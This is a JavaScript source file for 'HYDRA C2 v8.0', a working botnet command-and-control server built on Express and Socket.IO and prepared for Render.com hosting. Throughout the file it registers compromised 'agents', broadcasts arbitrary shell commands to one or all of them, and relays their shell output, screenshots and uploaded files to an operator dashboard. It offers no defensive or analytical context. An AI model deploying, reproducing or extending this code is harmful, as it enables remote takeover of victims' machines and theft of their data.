// NK HYDRA C2 v8.0 - GOD MODE SERVER
// REFACTORED FOR RENDER.COM DEPLOYMENT
// STRICT UI/AGENT SEPARATION

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();
app.use(cors());

// --- DASHBOARD UI ---
app.get('/', (req, res) => {
    res.send(`
    <html>
        <body style="background:black;color:#0f0;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;">
            <div style="text-align:center;">
                <h1>HYDRA C2 v8.0 [ACTIVE]</h1>
                <p>Status: ONLINE</p>
                <p>Use the NK App to connect.</p>
            </div>
        </body>
    </html>
    `);
});

const server = http.createServer(app);
const io = new Server(server, { 
    cors: { origin: "*" },
    pingTimeout: 30000,
    pingInterval: 10000
});

// MEMORY STORE
let agents = []; // Only real agents here.

io.on('connection', (socket) => {
    console.log(`[+] CONNECTION: ${socket.id}`);

    // --- IDENTIFICATION HANDLER ---
    socket.on('identify', (data) => {
        if (data.type === 'ui') {
            console.log('[UI] DASHBOARD CONNECTED');
            socket.join('ui_room');
            // SEND STATE IMMEDIATELY
            socket.emit('agents_list', agents);
            socket.emit('server_status', { status: 'HEALTHY' });
            return;
        }

        if (data.type === 'agent') {
            console.log(`[AGENT] NEW NODE: ${data.id}`);
            
            // REMOVE DUPLICATES
            agents = agents.filter(a => a.id !== data.id);
            
            const newAgent = {
                socketId: socket.id,
                id: data.id,
                os: data.os || 'Unknown',
                ip: data.ip || socket.handshake.address,
                status: 'Online',
                lastSeen: Date.now()
            };
            
            agents.push(newAgent);
            
            // NOTIFY UI
            io.to('ui_room').emit('agents_list', agents);
            io.to('ui_room').emit('agent_event', { 
                type: 'SYSTEM', 
                agentId: newAgent.id, 
                payload: 'Node Joined Swarm' 
            });
        }
    });

    // --- AGENT POLLING ---
    socket.on('get_agents', () => {
        socket.emit('agents_list', agents);
    });

    // --- COMMAND EXECUTION ---
    socket.on('exec_cmd', (data) => {
        const { targetId, cmd } = data;
        console.log(`[CMD] ${cmd} >> ${targetId}`);
        
        io.to('ui_room').emit('agent_event', { 
            type: 'SYSTEM', 
            agentId: 'SERVER', 
            payload: `Command dispatched: ${cmd}` 
        });

        if (targetId === 'all') {
            const active = agents.filter(a => a.status === 'Online');
            active.forEach(a => io.to(a.socketId).emit('exec', { cmd }));
        } else {
            const agent = agents.find(a => a.id === targetId);
            if (agent && agent.status === 'Online') {
                io.to(agent.socketId).emit('exec', { cmd });
            }
        }
    });

    // --- DATA STREAMING ---
    socket.on('stream_log', (data) => {
        io.to('ui_room').emit('agent_event', { 
            type: 'SHELL_OUTPUT', 
            agentId: data.from, 
            payload: data.output 
        });
    });

    socket.on('upload_file', (data) => {
        // Handle images/files
        io.to('ui_room').emit('agent_event', { 
            type: 'SCREENSHOT', 
            agentId: data.target || 'Unknown', 
            payload: data.b64content 
        });
    });

    // --- DISCONNECT ---
    socket.on('disconnect', () => {
        const agentIndex = agents.findIndex(a => a.socketId === socket.id);
        if (agentIndex !== -1) {
            const agent = agents[agentIndex];
            console.log(`[-] AGENT LOST: ${agent.id}`);
            // Mark offline instead of removing immediately for visibility
            agent.status = 'Offline'; 
            io.to('ui_room').emit('agents_list', agents);
            io.to('ui_room').emit('agent_event', { 
                type: 'SYSTEM', 
                agentId: agent.id, 
                payload: 'Node Offline' 
            });
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`HYDRA V8 LISTENING ON PORT ${PORT}`);
});
